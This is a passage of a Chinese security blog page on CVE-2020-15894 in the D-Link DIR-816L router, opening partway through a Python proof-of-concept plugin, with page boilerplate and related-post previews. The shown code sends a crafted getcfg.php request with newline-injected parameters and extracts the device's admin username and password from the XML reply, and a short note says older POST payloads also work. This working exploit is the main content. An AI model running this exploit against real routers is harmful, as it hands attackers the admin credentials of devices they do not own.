        <span class="c1"># Web网站相关信息
</span>        <span class="n">result</span><span class="p">[</span><span class="sh">"</span><span class="s">web</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
          <span class="c1"># 网站默认首页的title信息（可能含有单位或组织信息）
</span>          <span class="c1"># "title":""
</span>        <span class="p">}</span>
        <span class="c1"># 凭据类信息，针对各类弱口令、默认口令漏洞
</span>        <span class="n">result</span><span class="p">[</span><span class="sh">"</span><span class="s">login_credentials</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
          <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span> <span class="sh">"</span><span class="s">credential_type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">网站后台</span><span class="sh">"</span><span class="p">},</span>
        <span class="p">]</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
      <span class="k">pass</span>

    <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>

  <span class="k">def</span> <span class="nf">get_info</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
      <span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">googlr spider</span><span class="sh">"</span>
    <span class="p">}</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/getcfg.php?a=%0A_POST_SERVICES%3DDEVICE.ACCOUNT%0AAUTHORIZED_GROUP%3D1</span><span class="sh">"</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="sh">"</span><span class="s">DEVICE.ACCOUNT</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
        <span class="n">page</span> <span class="o">=</span> <span class="n">etree</span><span class="p">.</span><span class="nc">XML</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="sh">"</span><span class="s">/postxml/module/device/account/entry/name/text()</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">page</span><span class="p">.</span><span class="nf">xpath</span><span class="p">(</span><span class="sh">"</span><span class="s">/postxml/module/device/account/entry/password/text()</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
      <span class="k">pass</span>
    <span class="nf">return </span><span class="p">()</span>

  <span class="k">def</span> <span class="nf">parse_output</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
    <span class="n">output</span> <span class="o">=</span> <span class="nc">Output</span><span class="p">(</span><span class="n">self</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="nf">keys</span><span class="p">())</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
      <span class="n">json_result</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">result</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">json</span><span class="sh">"</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">result</span><span class="p">)}</span>
      <span class="p">}</span>
      <span class="n">output</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">json_result</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="n">output</span><span class="p">.</span><span class="nf">fail</span><span class="p">(</span><span class="sh">'</span><span class="s">Internet nothing returned</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">output</span>

<span class="nf">register_poc</span><span class="p">(</span><span class="n">TestPOC</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>
<h2 id="其它"><span class="me-2">其它</span><a href="#其它" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>这个漏洞是DIR-8XX的老问题了，不过之前的Payload的都为POST提交i的且参数也不一致。之前的Payload测试同样能够成功：</p>

<p><a href="/assets/img/DIR-816L/image-20200729164154687.png" class="popup img-link  shimmer"><img src="/assets/img/DIR-816L/image-20200729164154687.png" alt="image-20200729164154687" loading="lazy"></a></p>


  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/vulnerability/">vulnerability</a>,
          <a href="/categories/d-link/">D-Link</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=CVE-2020-15894%20D-Link%20DIR-816L%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20-%20imjdl%20blog&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDIR816L%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=CVE-2020-15894%20D-Link%20DIR-816L%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20-%20imjdl%20blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDIR816L%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FDIR816L%2F&text=CVE-2020-15894%20D-Link%20DIR-816L%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20-%20imjdl%20blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
    </div>
  </section>


            </div>

            
              
              



  <section id="toc-wrapper" class="ps-0 pe-4">
    <h2 class="panel-heading ps-3 pt-2 mb-2">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/vBulletin5-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1570505580"
  data-df="ll"
  
>
  Oct  8, 2019
</time>

              <h4 class="pt-0 my-2">vBulletin5 RCE</h4>
              <div class="text-muted">
                <p>
                  





                  Preface

RCE漏洞PoC被公开，该漏洞利用简单，可以直接在受害者服务中执行php代码。影响Vbulletin5.0.0至5.5.4版本，国外使用的较多。

PoC如下：

#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/cve-2019-19781-citrix-rce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1578627180"
  data-df="ll"
  
>
  Jan 10, 2020
</time>

              <h4 class="pt-0 my-2">CVE-2019-19781 Citrix Application DC & Citrix Gateway RCE</h4>
              <div class="text-muted">
                <p>
                  





                  Analysis

Two steps:

  Use path traversal request newbm.pl to write to xml file (1sh HTTP request).
  Template toolkit load and parse the xml file(2nd Request).


Path Traversal

In the published ...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/artica_proxy/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1596946380"
  data-df="ll"
  
>
  Aug  9, 2020
</time>

              <h4 class="pt-0 my-2">Artica Web Proxy 4.30 Authentication Bypass & OS Command Injection</h4>
              <div class="text-muted">
                <p>
                  





                  2024-03-01 UPDATE

I don’t know when Artica updated the source code for 4.30, filtering the api_key parameter, which resulted in the original payload becoming ineffective.
1
2
3
4
5
6
7
8
9
10
11
1...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/cve-2019-19781-citrix-rce/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>CVE-2019-19781 Citrix Application DC & Citrix Gateway RCE</p>
    </a>
  

  
    <a
      href="/posts/htb-October/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>HTB October Walkthrough</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->

  
  <!-- https://giscus.app/ -->
<script type="text/javascript">
  (function () {
    const origin = 'https://giscus.app';
    const iframe = 'iframe.giscus-frame';
    const lightTheme = 'light';
    const darkTheme = 'dark_dimmed';

    let initTheme = lightTheme;
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') &&
        html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') &&
        window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = darkTheme;
    }

    let giscusAttributes = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'imjdl/comments',
      'data-repo-id': 'MDEwOlJlcG9zaXRvcnkxNjc5MDc0Mjc=',
      'data-category': 'Announcements',
      'data-category-id': 'DIC_kwDOCgIQY84CbYtw',
      'data-mapping': 'url',
      'data-reactions-enabled': '1',
      'data-emit-metadata': '0',
      'data-theme': initTheme,
      'data-input-position': 'top',
      'data-lang': 'en',
      'data-loading': 'lazy',
      crossorigin: 'anonymous',
      async: ''
    };

    let giscusScript = document.createElement('script');
    Object.entries(giscusAttributes).forEach(([key, value]) =>
      giscusScript.setAttribute(key, value)
    );
    document.getElementById('tail-wrapper').appendChild(giscusScript);

    addEventListener('message', (event) => {
      if (
        event.source === window &&
        event.data &&
        event.data.direction === ModeToggle.ID
      ) {
        /* global theme mode changed */
        const mode = event.data.message;
        const theme = mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme;

        const message = {
          setConfig: {
            theme: theme
          }
        };

        const giscus = document.querySelector(iframe).contentWindow;
        giscus.postMessage({ giscus: message }, origin);
      }
    });
  })();
</script>



            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>
    ©
    <time>2024</time>
    <a href="https://twitter.com/Mortyjin">Mortyjin</a>.
    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/rce/">RCE</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.21.3/dist/tocbot.min.js,npm/mermaid@10.6.0/dist/mermaid.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>


  <!-- MathJax -->
  <script>
    /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
    MathJax = {
      tex: {
        /* start/end delimiter pairs for in-line math */
        inlineMath: [
          ['$', '$'],
          ['\\(', '\\)']
        ],
        /* start/end delimiter pairs for display math */
        displayMath: [
          ['$$', '$$'],
          ['\\[', '\\]']
        ]
      }
    };
  </script>
  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"></script>





    
      <!-- mermaid-js loader -->
<script type="text/javascript">
  (function () {
    function updateMermaid(event) {
      if (event.source === window && event.data && event.data.direction === ModeToggle.ID) {
        const mode = event.data.message;

        if (typeof mermaid === 'undefined') {
          return;
        }

        let expectedTheme = mode === ModeToggle.DARK_MODE ? 'dark' : 'default';
        let config = { theme: expectedTheme };

        /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $('.mermaid').each(function () {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr('data-processed');
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, '.mermaid');
      }
    }

    let initTheme = 'default';
    const html = document.documentElement;

    if (
      (html.hasAttribute('data-mode') && html.getAttribute('data-mode') === 'dark') ||
      (!html.hasAttribute('data-mode') && window.matchMedia('(prefers-color-scheme: dark)').matches)
    ) {
      initTheme = 'dark';
    }

    let mermaidConf = {
      theme: initTheme /* <default|dark|forest|neutral> */
    };

    /* Create mermaid tag */
    document.querySelectorAll('pre>code.language-mermaid').forEach((elem) => {
      const svgCode = elem.textContent;
      const backup = elem.parentElement;
      backup.classList.add('unloaded');
      /* create mermaid node */
      let mermaid = document.createElement('pre');
      mermaid.classList.add('mermaid');
      const text = document.createTextNode(svgCode);
      mermaid.appendChild(text);
      backup.after(mermaid);
    });

    mermaid.initialize(mermaidConf);

    window.addEventListener('message', updateMermaid);
  })();
</script>

    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

